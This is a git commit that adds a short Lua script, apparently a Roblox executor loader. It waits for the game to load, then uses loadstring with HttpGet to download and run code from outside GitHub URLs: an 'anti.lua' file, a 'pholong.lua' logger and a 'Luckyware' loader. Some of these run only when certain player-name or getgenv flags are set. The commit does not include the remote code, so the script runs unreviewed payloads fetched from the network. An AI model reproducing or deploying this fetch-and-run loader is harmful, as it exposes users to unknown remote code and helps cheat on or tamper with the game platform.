b0d1e78cb0a84c9fbcd7a779bd8bbe0b6ca0e555
unblocked6969 <60207373+startgoogle@users.noreply.github.com>
2023-07-26 10:12:14 -0700

    Create Misc.lua

---
+++ Misc.lua
@@ -0,0 +1,29 @@
+repeat
+    task.wait()
+until game:IsLoaded()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/startgoogle/zues/main/anti.lua"))()
+
+if game:GetService("Players").LocalPlayer.Name == getgenv().PlayerUser then
+    -- // Variables
+    local CoreGui = game:GetService("CoreGui")
+    local LuckyWare;
+
+    if CoreGui:FindFirstChild("ScreenGui"):FindFirstChild("TextButton") then
+        LuckyWare = CoreGui:FindFirstChild("ScreenGui")
+    end
+
+    if getgenv().PortalOwner then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/startgoogle/zues/main/pholong.lua"))()
+        print("Pho Log Execute")
+    end
+
+    if getgenv().LuckyWare then
+        if LuckyWare then
+            print("LuckyWare Instance")
+        else
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/DistributionError/Luckyware/main/Loader"))()
+            print("LuckyWare not found!")
+        end
+    end
+end
